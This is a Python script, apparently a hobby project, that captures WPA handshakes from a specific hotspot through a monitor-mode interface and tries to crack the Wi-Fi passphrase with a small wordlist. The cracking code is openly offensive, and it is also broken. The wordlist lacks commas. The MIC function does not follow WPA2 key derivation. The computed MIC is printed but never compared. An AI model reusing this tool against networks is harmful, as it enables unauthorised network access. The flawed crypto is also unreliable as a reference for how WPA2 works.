from typing import Dict

from Cryptodome.Hash import SHA256
from Cryptodome.Hash.HMAC import HMAC
from Cryptodome.Protocol.KDF import PBKDF2

from core.filters import FilterAggregate, RadioTapHeaderFilter, DataFrameFilter, QoSDataFrameFilter, \
    LogicalLinkControlAuthenticationFilter, AuthenticationKeyTypeFilter, CRC32Filter, DataFrameBssidFilter
from core.frame import EAPOLHandshakeFrame, EAPOLHandshakeNumber
from core.parser import RawDataParser, EAPOLHandshakeFrameParser
from core.sniffer import PacketSniffer

import hmac
import hashlib


def calculate_pmk(psk, ssid):
    psk_bytes = psk.encode('utf-8')
    ssid_bytes = ssid.encode('utf-8')

    pmk = PBKDF2(psk_bytes, ssid_bytes, 4096, 32).hex()

    return pmk


def calculate_mic(pmk, a_nonce, s_nonce, mac_ap, mac_sta):
    pmk_bytes = bytes.fromhex(pmk)
    a_nonce_bytes = bytes.fromhex(a_nonce)
    s_nonce_bytes = bytes.fromhex(s_nonce)
    mac_ap_bytes = bytes.fromhex(mac_ap)
    mac_sta_bytes = bytes.fromhex(mac_sta)

    # Calculate the MIC
    hmac_key = HMAC(pmk_bytes, digestmod=SHA256)
    hmac_key.update(b'Pairwise key expansion')

    # Concatenate the nonces and MAC addresses
    data = a_nonce_bytes + s_nonce_bytes + mac_ap_bytes + mac_sta_bytes

    mic = hmac_key.hexdigest()
    mic = hmac_key.update(data)
    mic = hmac_key.hexdigest()

    return mic


PASSWORD_WORDLIST = [
    "adminadmin"
    "12345678!"
    "pleaseleavemealone"
]


def crack_password(ssid: str, handshake: Dict[EAPOLHandshakeNumber, EAPOLHandshakeFrame]):
    a_nonce = handshake[EAPOLHandshakeNumber.M1].wpa_key_nonce
    s_nonce = handshake[EAPOLHandshakeNumber.M2].wpa_key_nonce
    a_mac = "".join(handshake[EAPOLHandshakeNumber.M1].src_addr.split(":"))
    s_mac = "".join(handshake[EAPOLHandshakeNumber.M1].dest_addr.split(":"))

    mic4 = handshake[EAPOLHandshakeNumber.M4].key_mic

    print(ssid, a_nonce, s_nonce, a_mac, s_mac, mic4)

    for password in PASSWORD_WORDLIST:
        pmk = calculate_pmk(password, ssid)

        calculated_mic4 = calculate_mic(pmk, a_nonce, s_nonce, a_mac, s_mac)
        print(mic4, calculated_mic4)


# random mac from android hot spot
bssid = "a2:cf:2d:38:59:0c"
ssid = "Galaxy A31F192"
iface = "wlp4s0mon"

packet_sniffer = PacketSniffer(
    iface,
    EAPOLHandshakeFrameParser(),
    FilterAggregate(
        CRC32Filter(),
        RadioTapHeaderFilter(),
        DataFrameFilter(),
        DataFrameBssidFilter(bssid),
        QoSDataFrameFilter(),
        LogicalLinkControlAuthenticationFilter(),
        AuthenticationKeyTypeFilter()
    )
)

captured_handshakes = {}

for packet in packet_sniffer.listen():
    packet: EAPOLHandshakeFrame

    # HACK - wrong packet parsing
    supplicant_ssid = packet.dest_addr if packet.dest_addr != bssid else packet.bssid
    print(f"Captured {packet.message_number} frame from supplicant {supplicant_ssid}")
    print(packet)

    if supplicant_ssid not in captured_handshakes:
        captured_handshakes[supplicant_ssid] = {}

    captured_handshakes[supplicant_ssid][packet.message_number] = packet

    if len(captured_handshakes[supplicant_ssid]) == 4:
        print(f"Captured 4 packets from {supplicant_ssid}. Starting password cracking.")
        crack_password(ssid, captured_handshakes[supplicant_ssid])

